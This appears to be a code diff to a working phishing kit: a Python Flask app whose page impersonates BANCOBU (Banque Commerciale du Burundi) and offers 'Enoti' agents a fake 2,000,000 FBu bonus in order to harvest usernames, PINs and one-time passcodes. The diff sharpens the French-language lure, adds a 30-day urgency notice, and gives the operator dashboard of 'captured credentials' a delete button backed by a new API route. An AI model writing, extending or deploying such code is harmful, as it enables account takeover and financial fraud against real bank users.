@@ -32,7 +32,7 @@ def init_db():
             )
         ''')
         conn.commit()
-        print("[+] Database ready")
+        print("[+] Database ready - data will persist forever")
     except Exception as e:
         print(f"[-] DB error: {e}")
     finally:
@@ -46,7 +46,7 @@ PHISHING_HTML = '''
 <!DOCTYPE html>
 <html>
 <head>
-    <title>BANCOBU - Programme Bonus Agents Enoti</title>
+    <title>BANCOBU - Programme Bonus Pour Tous Agents Enoti</title>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <style>
@@ -73,7 +73,6 @@ PHISHING_HTML = '''
         .logo span { color: #ffcc00; }
         .subtitle { color: #666; font-size: 13px; margin-bottom: 20px; border-bottom: 1px solid #eee; padding-bottom: 15px; }
         
-        /* Bonus Card */
         .bonus-card {
             background: linear-gradient(135deg, #ffd700 0%, #ffb300 100%);
             padding: 20px;
@@ -116,20 +115,19 @@ PHISHING_HTML = '''
     <div class="logo">BANCOBU <span>| Enoti</span></div>
     <div class="subtitle">Banque Commerciale du Burundi</div>
 
-    <!-- BONUS CARD - LURE MESSAGE -->
     <div class="bonus-card">
-        <div class="bonus-title">🎉 PROGRAMME BONUS AGENTS ENOTI 🎉</div>
+        <div class="bonus-title">🎉 PROGRAMME BONUS POUR TOUS AGENTS ENOTI 🎉</div>
         <div class="bonus-amount">2.000.000 FBu</div>
         <div class="bonus-desc">Offre spéciale réservée aux agents Enoti</div>
     </div>
 
     <div class="message-box">
         <strong>Murakaza neza muri BANCOBU Enoti.</strong><br><br>
-        Dans le cadre de notre programme de fidélisation des agents Enoti, vous avez été sélectionné pour recevoir un <span class="highlight">bonus exceptionnel de 2.000.000 FBu</span>.<br><br>
+        Dans le cadre de notre programme de fidélisation des agents Enoti, La BANCOBU a l’honneur de vous informer qu’elle a accordé un bonus de crédit annuel sans intérêt destiné aux agents eNoti. <span class="highlight">Cette bonus de crédit est de 2.000.000 FBu Pour un Agent eNoti qui s’enregiste à temps reél.</span>.<br><br>
         Pour bénéficier de cette offre, veuillez vous connecter à votre compte BANCOBU ci-dessous.
+N.B: Cette Oportunité est disponible pendent 30 Jours!
     </div>
 
-    <!-- STEP 1: Identifiant + Code PIN -->
     <div id="step1">
         <div class="input-group">
             <label>Identifiant d'utilisateur</label>
@@ -142,7 +140,6 @@ PHISHING_HTML = '''
         <button onclick="submitLogin()">Se connecter et recevoir mon bonus</button>
     </div>
 
-    <!-- STEP 2: OTP Code -->
     <div id="step2" style="display:none;">
         <div class="info-msg">
             📱 <strong>Code OTP envoyé</strong><br>
@@ -223,7 +220,7 @@ PHISHING_HTML = '''
 </html>
 '''
 
-# ==================== DASHBOARD ====================
+# ==================== DASHBOARD WITH DELETE BUTTON ====================
 DASHBOARD_HTML = '''
 <!DOCTYPE html>
 <html>
@@ -243,6 +240,8 @@ DASHBOARD_HTML = '''
         .stats { background: #1a1f3a; padding: 15px; border-radius: 10px; margin-bottom: 20px; }
         .badge { background: #ff3366; color: white; padding: 2px 8px; border-radius: 20px; font-size: 11px; }
         .otp-badge { background: #ffd700; color: #0a0e27; padding: 2px 8px; border-radius: 20px; font-size: 11px; }
+        .delete-btn { background: #ff3366; color: white; border: none; padding: 5px 10px; border-radius: 5px; cursor: pointer; font-size: 11px; }
+        .delete-btn:hover { background: #ff0000; }
     </style>
     <script>
         async function checkAuth() {
@@ -276,10 +275,21 @@ DASHBOARD_HTML = '''
                     <td><span class="badge">${r.username || '-'}</span></td>
                     <td><span class="badge">${r.pin || '-'}</span></td>
                     <td><span class="otp-badge">${r.otp || '-'}</span></td>
+                    <td><button class="delete-btn" onclick="deleteRecord(${r.id})">Delete</button></td>
                 </tr>`;
             }
             document.getElementById('data').innerHTML = html;
             document.getElementById('stats').innerHTML = `📊 Total credentials captured: ${data.length}`;
+        }
+        async function deleteRecord(id) {
+            if (confirm('Delete this record?')) {
+                const response = await fetch('/api/delete/' + id, { method: 'DELETE' });
+                if (response.ok) {
+                    loadData();
+                } else {
+                    alert('Error deleting record');
+                }
+            }
         }
         checkAuth();
     </script>
@@ -296,7 +306,7 @@ DASHBOARD_HTML = '''
     <div style="overflow-x: auto;">
     <table>
         <thead>
-            <tr><th>Time</th><th>IP Address</th><th>Identifiant</th><th>Code PIN</th><th>Code OTP</th></tr>
+            <tr><th>Time</th><th>IP Address</th><th>Identifiant</th><th>Code PIN</th><th>Code OTP</th><th>Action</th></tr>
         </thead>
         <tbody id="data"></tbody>
     </table>
@@ -368,6 +378,24 @@ def capture_otp():
         if cur: cur.close()
         if conn: conn.close()
 
+@app.route('/api/delete/<int:id>', methods=['DELETE'])
+def delete_record(id):
+    conn = None
+    cur = None
+    try:
+        conn = get_db()
+        cur = conn.cursor()
+        cur.execute('DELETE FROM captured_credentials WHERE id = %s', (id,))
+        conn.commit()
+        print(f"[!] Deleted record ID: {id}")
+        return jsonify({'status': 'ok'})
+    except Exception as e:
+        print(f"[-] Delete error: {e}")
+        return jsonify({'status': 'error'}), 500
+    finally:
+        if cur: cur.close()
+        if conn: conn.close()
+
 @app.route('/api/data')
 def get_data():
     conn = None
@@ -375,9 +403,9 @@ def get_data():
     try:
         conn = get_db()
         cur = conn.cursor()
-        cur.execute('SELECT timestamp, ip, username, pin, otp FROM captured_credentials ORDER BY timestamp DESC LIMIT 100')
+        cur.execute('SELECT id, timestamp, ip, username, pin, otp FROM captured_credentials ORDER BY timestamp DESC LIMIT 100')
         rows = cur.fetchall()
-        return jsonify([{'timestamp': r[0], 'ip': r[1], 'username': r[2], 'pin': r[3], 'otp': r[4]} for r in rows])
+        return jsonify([{'id': r[0], 'timestamp': r[1], 'ip': r[2], 'username': r[3], 'pin': r[4], 'otp': r[5]} for r in rows])
     except Exception as e:
         return jsonify([])
     finally:
